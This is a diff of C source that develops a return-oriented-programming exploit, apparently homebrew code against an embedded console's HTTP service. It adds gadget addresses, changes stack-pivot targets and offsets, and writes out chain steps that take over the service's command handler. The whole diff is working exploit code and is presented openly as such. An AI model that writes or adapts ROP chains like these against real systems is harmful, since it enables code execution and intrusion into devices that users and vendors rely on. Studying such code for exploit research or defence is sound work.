@@ -36,6 +36,9 @@ u32 ROP_STRR7_R5x48_POPR4R5R6R7R8PC = 0x00102430;//Write r7 to r5+0x48. "pop {r4
 
 u32 ROP_POP_R4R5R6R7R8R9SLFPIPPC = 0x00102e10;//"pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}"
 
+u32 ROP_PUSHR42IPLR_CMPR0_RETURN = 0x00102d08;
+u32 ROP_PUSHR42IPLR_CMPR0_RETURN_STATEPTR = 0x0011c31c;
+
 u32 ROP_ADDR0IP = 0x0010bc2c;//r0+= ip, bx-lr.
 
 u32 ROP_MOVR0R4_POPR4PC = 0x00100698;//"mov r0, r4" "pop {r4, pc}"
@@ -90,6 +93,7 @@ static u32 __custom_mainservsession_vtable;
 static u32 condcallfunc_objaddr;
 
 static u32 __httpmainthread_cmdhandler_stackframe = 0x0ffffe28;
+static u32 __httpmainthread_handlerfunc_stackframe = 0x0ffffe60;//Stackframe(sp+0) for the httpc_cmdhandler caller.
 
 static u32 ropheap = 0x0ffff000;//Main-thread stack-bottom.
 
@@ -753,8 +757,8 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	//Setup the stack-pivot on the main-thread stack for the custom cmdhandler, located at <httpc_cmdhandler caller func> sp+0.
 	tmpdata_ptr = tmpdata;
-	tmpdata_addr = 0x0ffffe60-4;
-	ropgen_stackpivot(&tmpdata_ptr, &tmpdata_addr, ropvmem_base);
+	tmpdata_addr = __httpmainthread_handlerfunc_stackframe-4;
+	ropgen_stackpivot(&tmpdata_ptr, &tmpdata_addr, ropvmem_base + 0x20 + 0x40 + 0x74 + 0x8);
 	tmpdata_addr-= 8;
 
 	ropgen_setr0(&ropchain, &http_ropvaddr, tmpdata[1]);
@@ -852,7 +856,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 *ropchain_block1, ropvaddr_block1;
 
 	u32 ropallocsize = 0x4000;
-	u32 ropoffset = 0x200;
+	u32 ropoffset = 0x500;
 	u32 bakropoff = ropoffset + ropallocsize;
 	u32 roplaunch_bakaddr;
 	u32 roplaunch_baksize;
@@ -924,6 +928,18 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Due to the "mov r0, r4" done previously, r0 contains the cmdbuf ptr at this point. Save that ptr @ ropheap+0x0.
 	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe + 24 + 12, ropheap+0x4, 0x3);//Copy the _this value for httpc_cmdhandler, from the saved r7 in the httpc_cmdhandler stackframe to ropheap+0x4.
+
+	//Copy the backup ROP-chain to the main offset then pivot to the main ROP-chain.
+	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base+ropoffset, ropvmem_base+bakropoff, ropallocsize);
+	ropgen_stackpivot(&ropchain, &ropvaddr, ropvmem_base+ropoffset);
+
+	//Start of the initial ROP for the custom cmdhandler.
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//Write the _this from r0 to ropheap+0x4.
+	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_handlerfunc_stackframe+0x7c, ropheap+0x0, 0x3);//Copy the cmdbuf ptr from stack to ropheap+0x0.
+	ropgen_copyu32(&ropchain, &ropvaddr, ROP_PUSHR42IPLR_CMPR0_RETURN_STATEPTR+4, ropheap+0x8, 0x3);//Save/restore the word overwritten by the ROP_PUSHR42IPLR_CMPR0_RETURN gadget.
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0x08000004, 1);//Load the zero from 0x08000004 into r0, since the ROP_PUSHR42IPLR_CMPR0_RETURN gadget requires it.
+	ropgen_blxr3(&ropchain, &ropvaddr, ROP_PUSHR42IPLR_CMPR0_RETURN, 1);//Save r4-ip and lr on stack.
+	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x8, ROP_PUSHR42IPLR_CMPR0_RETURN_STATEPTR+4, 0x3);
 
 	//Copy the backup ROP-chain to the main offset then pivot to the main ROP-chain.
 	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base+ropoffset, ropvmem_base+bakropoff, ropallocsize);
